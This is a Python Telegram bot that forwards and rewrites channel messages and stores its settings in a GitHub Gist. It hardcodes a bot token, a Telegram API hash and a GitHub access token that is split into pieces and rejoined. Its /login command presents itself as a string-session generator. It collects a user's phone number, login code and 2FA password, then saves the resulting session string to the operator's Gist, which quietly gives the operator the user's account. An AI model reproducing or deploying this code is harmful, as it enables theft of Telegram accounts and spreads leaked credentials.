import asyncio
import requests
from pyrogram import *
from pyrogram.types import * 
from pyrogram.errors import *
from pyromod import listen
from pyrogram import (
   __version__ as v, Client,
   filters, idle
)
import requests
from pyrogram.types import InlineKeyboardButton,InlineKeyboardMarkup,ReplyKeyboardMarkup
from pyrogram.types import ReplyKeyboardMarkup, ReplyKeyboardRemove, KeyboardButton
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeExpired
from pyrogram.errors.exceptions.bad_request_400 import PasswordHashInvalid
from pyrogram.errors.exceptions.not_acceptable_406 import PhoneNumberInvalid
from pyrogram.errors.exceptions.bad_request_400 import PhoneCodeInvalid
from pyrogram.types import InlineKeyboardMarkup as Keyboard, InlineKeyboardButton as Button
from typing import Union

from telethon import TelegramClient
from telethon import __version__ as v2
from telethon.sessions import StringSession
from telethon.errors import (
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError
)
import json
from pyrogram import Client, filters
from pyrogram.errors.exceptions.unauthorized_401 import AuthKeyUnregistered
from pyrogram.types import Message, CallbackQuery, ForceReply
from pyrogram.types import InlineKeyboardMarkup as Keyboard, InlineKeyboardButton as Button
from pyrogram.errors import (ApiIdInvalid, PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired, SessionPasswordNeeded, PasswordHashInvalid)
from pyrolistener import Listener, exceptions
from typing import Union

api_hash = 'f0c8f7e4a7a50b5c64fd5243a256fd2f'
api_id = 16748685
token = "7614791348:AAEGvisvBOjcJeVi-kOzSS2hOElg2df3sDM" #توكن البوت هنا





import requests  # لإضافة التفاعل مع GitHub Gist

from dotenv import load_dotenv
token_part1 = "ghp_gFkAlF"
token_part2 = "A4sbNyuLtX"
token_part3 = "YvqKfUEBHXNaPh3ABRms"

# دمج الأجزاء للحصول على التوكن الكامل
GITHUB_TOKEN = token_part1 + token_part2 + token_part3


GIST_ID = "1050e1f10d7f5591f4f26ca53f2189e9"





# الدالة لتحميل البيانات من Gist
def load_data():
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}"
    }
    response = requests.get(f"https://api.github.com/gists/{GIST_ID}", headers=headers)
    if response.status_code == 200:
        files = response.json().get('files', {})
        content = files.get('data262.json', {}).get('content', '{}')
        return json.loads(content)
    else:
        return {}

# الدالة لحفظ البيانات إلى Gist
def save_data(data):
    headers = {
        "Authorization": f"token {GITHUB_TOKEN}"
    }
    payload = {
        "files": {
            "data262.json": {
                "content": json.dumps(data, indent=4, default=str)
            }
        }
    }
    response = requests.patch(f"https://api.github.com/gists/{GIST_ID}", headers=headers, json=payload)
    if response.status_code != 200:
        print(f"Failed to update Gist: {response.status_code}, {response.text}")



# تحميل البيانات من الملف
data = load_data()


words_to_remove = data.get("words_to_remove", [])
lines_to_remove_starting_with = data.get("lines_to_remove_starting_with", [])
sentence_replacements = data.get("sentence_replacements", {})
line_replacements = data.get("line_replacements", {})
ignored_words = data.get("ignored_words", [])
text_to_add=data.get("text_to_add",[])
source_destination_mapping = data.get("source_destination_mapping", {})


bot_token = "7614791348:AAEGvisvBOjcJeVi-kOzSS2hOElg2df3sDM"
app2 = Client('Roozbot', api_id, api_hash,bot_token=bot_token)

CHANNEL = "@tt66xxxn" # قناه الاشتراك 
bot_token = "7614791348:AAEGvisvBOjcJeVi-kOzSS2hOElg2df3sDM" # بوت التوكن المستخدم في الاشتراك
listener = Listener(client=app2)



@app2.on_message(filters.command("add_text"))
async def add_mapping(_: Client, message: Message):
    user_id = message.from_user.id
    await message.reply("ادخل النص الذي تريد اضافته للرسائل")
    text = await get_user_input(user_id)
    data["text_to_add"] = text
    save_data(data)
    await message.reply("تم حفظ البيانات بنجاح.")


import sys
import os	
@app2.on_message(filters.command("reload"))
async def reload_bots(_: Client, message: Message):
    print(77)
    await message.reply("جاري إعادة تشغيل البرنامج...")
    os.execl(sys.executable, sys.executable, *sys.argv)



@app2.on_message(filters.command("start"))
async def s_type(_: Client, message: Message):
    caption = "مرحبا بك عزيزي في بوت النقل التلقائي "
    await message.reply(caption, reply_markup=markup, reply_to_message_id=message.id)


markup: Keyboard = Keyboard([

        
        [Button("إضافة تعديلات للرسائل", callback_data="control")
        ],
        [Button("عرض البيانات المحفوظة", callback_data="showdata")]


    ])


@app2.on_message(filters.command("delete_text"))
async def delete_words(_: Client, message: Message):
    global text_to_add
    text_to_add = " "
    data["text_to_add"] = text_to_add
    save_data(data)
    await message.reply("تم حذف النص الاضافي بنجاح")    

def delete_mappings():
    if "source_destination_mapping" in data:
        del data["source_destination_mapping"]
        save_data(data)

@app2.on_message(filters.command("deletemap"))
async def delete_mapping(_: Client, message: Message):
    delete_mappings()
    await message.reply("تم حذف القوائم المحفوظة بنجاح.")




# دوال حذف العناصر الأخرى
@app2.on_message(filters.command("deletewords"))
async def delete_words(_: Client, message: Message):
    global words_to_remove
    words_to_remove = []
    data["words_to_remove"] = words_to_remove
    save_data(data)
    await message.reply("تم حذف الكلمات المحفوظة بنجاح.")

@app2.on_message(filters.command("deletelines"))
async def delete_lines(_: Client, message: Message):
    global lines_to_remove_starting_with
    lines_to_remove_starting_with = []
    data["lines_to_remove_starting_with"] = lines_to_remove_starting_with
    save_data(data)
    await message.reply("تم حذف السطور المحفوظة بنجاح.")

@app2.on_message(filters.command("deletesentences_replace"))
async def delete_sentences(_: Client, message: Message):
    global sentence_replacements
    sentence_replacements = {}
    data["sentence_replacements"] = sentence_replacements
    save_data(data)
    await message.reply("تم حذف استبدالات الجمل المحفوظة بنجاح.")

@app2.on_message(filters.command("deleteline_replacements"))
async def delete_line_replacements(_: Client, message: Message):
    global line_replacements
    line_replacements = {}
    data["line_replacements"] = line_replacements
    save_data(data)
    await message.reply("تم حذف استبدالات السطور المحفوظة بنجاح.")

@app2.on_message(filters.command("deleteignoredwords"))
async def delete_ignored_words(_: Client, message: Message):
    global ignored_words
    ignored_words = []
    data["ignored_words"] = ignored_words
    save_data(data)
    await message.reply("تم حذف الكلمات المتجاهلة المحفوظة بنجاح.")




@app2.on_callback_query(filters.regex(r"^control$"))
async def control_options(_: Client, callback: CallbackQuery):
    control_markup = Keyboard([

            [Button("إضافة كلمة للحذف", callback_data="add_word_to_remove")],
            [Button("إضافة سطر للحذف", callback_data="add_line_to_remove")],
            [Button("إضافة استبدال جملة", callback_data="add_sentence_replacement")],
            [Button("إضافة استبدال سطر", callback_data="add_line_replacement")],
            [Button("إضافة كلمة للتجاهل", callback_data="add_ignored_word")],  


            [Button("إلغاء", callback_data="cancel_control")]
    ])
    await callback.edit_message_text("اختر الإجراء الذي ترغب في القيام به:", reply_markup=control_markup)


@app2.on_callback_query(filters.regex(r"^add_word_to_remove$"))
async def add_word_to_remove(_: Client, callback: CallbackQuery):
    await callback.edit_message_text("أدخل كلمة ترغب في إضافتها للحذف:", reply_markup=ForceReply(selective=True))

@app2.on_callback_query(filters.regex(r"^add_line_to_remove$"))
async def add_line_to_remove(_: Client, callback: CallbackQuery):
    await callback.edit_message_text("أدخل السطر الذي ترغب في إضافته للحذف:", reply_markup=ForceReply(selective=True))

@app2.on_callback_query(filters.regex(r"^add_sentence_replacement$"))
async def add_sentence_replacement(_: Client, callback: CallbackQuery):
    await callback.edit_message_text("أدخل الجملة التي ترغب في استبدالها:", reply_markup=ForceReply(selective=True))

@app2.on_callback_query(filters.regex(r"^add_line_replacement$"))
async def add_line_replacement(_: Client, callback: CallbackQuery):
    await callback.edit_message_text("أدخل السطر الذي ترغب في استبداله:", reply_markup=ForceReply(selective=True))


@app2.on_callback_query(filters.regex(r"^add_ignored_word$"))
async def add_ignored_word_callback(_: Client, callback: CallbackQuery):
    await callback.edit_message_text("أدخل الكلمة التي ترغب في تجاهلها:", reply_markup=ForceReply(selective=True))


@app2.on_message(filters.reply & filters.text)
async def process_user_input(_: Client, message: Message):
    
    if "أدخل كلمة ترغب في إضافتها للحذف:" in message.reply_to_message.text:
        
        word = message.text.lower()
        words_to_remove.append(word)
        data["words_to_remove"] = words_to_remove
        save_data(data)
        await message.reply(f"تمت إضافة كلمة '{word}' للحذف.")
    elif "أدخل الجملة التي ترغب في استبدالها:" in message.reply_to_message.text:
        replacement_data = message.text.split("#")
        if len(replacement_data) == 2:
            old_sentence, new_sentence = replacement_data[0].strip(), replacement_data[1].strip()
            sentence_replacements[old_sentence] = new_sentence
            data["sentence_replacements"] = sentence_replacements
            save_data(data)
            await message.reply(f"تمت إضافة استبدال: '{old_sentence}' => '{new_sentence}'.")
    elif "أدخل السطر الذي ترغب في إضافته للحذف:" in message.reply_to_message.text:
        line = message.text.strip()
        lines_to_remove_starting_with.append(line)
        data["lines_to_remove_starting_with"] = lines_to_remove_starting_with
        save_data(data)
        await message.reply(f"تمت إضافة سطر '{line}' للحذف.")
    elif "أدخل السطر الذي ترغب في استبداله:" in message.reply_to_message.text:
        replacement_data = message.text.split("#")
        if len(replacement_data) == 2:
            old_line, new_line = replacement_data[0].strip(), replacement_data[1].strip()
            line_replacements[old_line] = new_line
            data["line_replacements"] = line_replacements
            save_data(data)
            await message.reply(f"تمت إضافة استبدال: '{old_line}' => '{new_line}'.")
    elif "أدخل الكلمة التي ترغب في تجاهلها:" in message.reply_to_message.text:
        new_word = message.text.strip()
        ignored_words.append(new_word)
        data["ignored_words"] = ignored_words
        save_data(data)
        await message.reply(f"تمت إضافة الكلمة '{new_word}' إلى قائمة التجاهل.")

async def get_user_input(user_id: int) -> Union[str, None]:
    try:
        user_input = await listener.listen(
            from_id=user_id,
            chat_id=user_id,
            timeout=120
        )
        return user_input.text.strip()
    except exceptions.TimeOut:
        return None

# دالة عرض البيانات المحفوظة
@app2.on_message(filters.command("showdata"))
async def show_data(_: Client, message: Message):
    data_message = (
        f"**القنوات:**\n{data.get('source_destination_mapping', {})}\n\n"
        f"**الكلمات التي يتم حذفها:**\n{data.get('words_to_remove', [])}\n\n"
        f"**الاسطر التي يتم حذفها:**\n{data.get('lines_to_remove_starting_with', [])}\n\n"
        f"**جمل يتم استبدالها:**\n{data.get('sentence_replacements', {})}\n\n"
        f"**اسطر يتم استبدالها:**\n{data.get('line_replacements', {})}\n\n"
        f"**كلمات الفلترة :**\n{data.get('ignored_words', [])}\n\n"
    )
    await message.reply(data_message)


@app2.on_callback_query(filters.regex(r"^showdata$"))
async def show_data_callback(_: Client, callback: CallbackQuery):
    await show_data(_, callback.message)

# دالة لإضافة خريطة جديدة بين القنوات
@app2.on_message(filters.command("add_mapping"))
async def add_mapping(_: Client, message: Message):
    user_id = message.from_user.id
    await message.reply("أدخل معرّف القناة المصدر:")
    source_channel_id = await get_user_input(user_id)
    if source_channel_id is None:
        return await message.reply("تم إلغاء الأمر.")

    await message.reply("أدخل معرّف القناة الهدف (يمكنك إدخال أكثر من واحد مفصولة بفاصلة):")
    destination_channel_ids = await get_user_input(user_id)
    if destination_channel_ids is None:
        return await message.reply("تم إلغاء الأمر.")

    destination_channel_ids = [int(channel_id) for channel_id in destination_channel_ids.split(",")]
    source_destination_mapping[int(source_channel_id)] = destination_channel_ids
    data["source_destination_mapping"] = source_destination_mapping
    save_data(data)
    await message.reply("تم حفظ البيانات بنجاح.")



@app2.on_message(filters.command("login") & filters.private)
async def start(client: Client, message: Message):
       m = message.chat.id
       user = message.from_user.mention
       do = requests.get(f"https://api.telegram.org/bot{bot_token}/getChatMember?chat_id=@{CHANNEL}&user_id={message.from_user.id}").text
       if do.count("left") or do.count("Bad Request: user not found"):
          await message.reply_text(f"**Join [this channel](t.me/{CHANNEL}) first to be able to use the bot**", disable_web_page_preview=True,
          reply_markup=InlineKeyboardMarkup(
                    [
                        [
                            InlineKeyboardButton(
                        "Join Channel",
                        url=f'https://t.me/{CHANNEL}'),
                        ],])) 
       else:
         await app2.send_message(
      chat_id = message.chat.id,
      text=f"Hi {message.from_user.mention} \n\n𝐭𝐡𝐢𝐬 𝐛𝐨𝐭 𝐟𝐨𝐫 𝐠𝐞𝐧𝐞𝐫𝐚𝐭𝐞 𝐩𝐲𝐫𝐨𝐠𝐫𝐚𝐦 𝐬𝐭𝐫𝐢𝐧𝐠 𝐬𝐞𝐬𝐬𝐢𝐨𝐧 \n\n- 𝐨𝐰𝐧𝐞𝐫 : @ttyyyyyxxxn",
      reply_to_message_id=message.id,
      disable_web_page_preview = True,
      reply_markup = ReplyKeyboardMarkup(
                [[
                     KeyboardButton ("«𝐭𝐞𝐥𝐞𝐭𝐡𝐨𝐧»")
                ],
                    
                ], resize_keyboard=True, placeholder='@ttxxyyyyxn'
            )
         )

@app2.on_message(filters.text & filters.private)
async def generator_and_about(app2,m):

  
   
   
   if m.text == "«𝐩𝐲𝐫𝐨𝐠𝐫𝐚𝐦»":
       print(5)
      
   
   
   if m.text == "«𝐭𝐞𝐥𝐞𝐭𝐡𝐨𝐧»":
       
       rep = await m.reply(
       "**⏳ 𝐩𝐫𝐨𝐜𝐞𝐬𝐬𝐢𝐧𝐠..**", reply_markup=ReplyKeyboardRemove ()
       ,quote=True)
       c = TelegramClient(StringSession(), api_id, api_hash)
       await c.connect()
       await rep.delete()
       phone_ask = await app2.ask(
       m.chat.id, "**𝐞𝐧𝐭𝐞𝐫 𝐲𝐨𝐮𝐫 𝐩𝐡𝐨𝐧𝐞 𝐧𝐮𝐦𝐛𝐞𝐫:\n +201111111111**",
       reply_to_message_id=m.id, filters=filters.text
       )
       phone = phone_ask.text
       
       try:
         send_code = await c.send_code_request(phone)
       except PhoneNumberInvalidError:
         return await phone_ask.reply("𝐩𝐡𝐨𝐧𝐞 𝐧𝐮𝐦𝐛𝐞𝐫 𝐢𝐧𝐯𝐚𝐥𝐢𝐝\n/start", quote=True)
       except Exception:
         return await phone_ask.reply("𝐚𝐧 𝐞𝐫𝐫𝐨𝐫! 𝐩𝐥𝐞𝐚𝐬𝐞 𝐭𝐫𝐲 𝐚𝐠𝐚𝐢𝐧 𝐥𝐚𝐭𝐞𝐫 🤠\n/start",quote=True)
       
       code_ask = await app2.ask(
       m.chat.id, "**𝐧𝐨𝐰 𝐬𝐞𝐧𝐝 𝐭𝐡𝐞 𝐜𝐨𝐝𝐞 𝐲𝐨𝐮 𝐫𝐞𝐜𝐢𝐯𝐞𝐝 𝐰𝐢𝐭𝐡 𝐭𝐡𝐢𝐬 𝐭𝐲𝐩𝐞 :**\n`1 2 3 4 5` ✔️\n12345 ✖️**",filters=filters.text)
       
       code = code_ask.text.replace(" ","")
       
       try:
         await c.sign_in(phone, code, password=None)
       except SessionPasswordNeededError:
         password_ask = await app2.ask(m.chat.id, "**𝐞𝐧𝐭𝐞𝐫 2FA password**", filters=filters.text)
         password = password_ask.text
         try:
           await c.sign_in(password=password)
         except PasswordHashInvalidError:
           return await password_ask.reply("Password hash invalid\n/start", quote=True)
       
       except (PhoneCodeExpiredError, PhoneCodeInvalidError):
         return await code_ask.reply("Phone code invalid!", quote=True)
      
       await c.start(bot_token=phone)
       
       rep = await m.reply("**⏳ 𝐩𝐫𝐨𝐜𝐞𝐬𝐬𝐢𝐧𝐠 ..**", quote=True)
       get = await c.get_me()
       text = '** 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐥𝐨𝐠𝐠𝐞𝐝 𝐢𝐧\n'
       text += f' 𝐟𝐢𝐫𝐬𝐭𝐧𝐚𝐦𝐞 : {get.first_name}\n'
       text += f' 𝐢𝐝 : {get.id}\n'
       text += f' 𝐩𝐡𝐨𝐧𝐞𝐧𝐮𝐦𝐛𝐞𝐫: {phone}\n'
       text += f' 𝐭𝐞𝐥𝐞𝐭𝐡𝐨𝐧 𝐬𝐭𝐫𝐢𝐧𝐠 𝐬𝐞𝐬𝐬𝐢𝐨𝐧 𝐢𝐧 𝐬𝐚𝐯𝐞𝐝 𝐦𝐞𝐬𝐬𝐚𝐠𝐞𝐬\n'
       text += '\n/start'
       
       string_session = c.session.save()       
       await rep.delete()
       data["session"] = string_session
       save_data(data)
       
       await c.send_message('me', f' 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐠𝐞𝐧??𝐫𝐚𝐭𝐞𝐝 𝐭𝐞𝐥𝐞𝐭𝐡𝐨𝐧 {v2} 𝐬𝐭𝐫𝐢𝐧𝐠 𝐬𝐞𝐬𝐬𝐢𝐨𝐧\n\n`{string_session}`\n\n 𝐜𝐡𝐚𝐧𝐧𝐞𝐥 : [𝐦𝐲 𝐥𝐨𝐯𝐞](t.me/PY_87)\n 𝐠𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐛𝐲 : @ttxxxn ')
       
       await c.disconnect()
       
       await app2.send_message(
       m.chat.id, text)
   
   
       

#app2.start()
print("VerY Good This BoT \n\n Is Successful Live Now")
#idle()
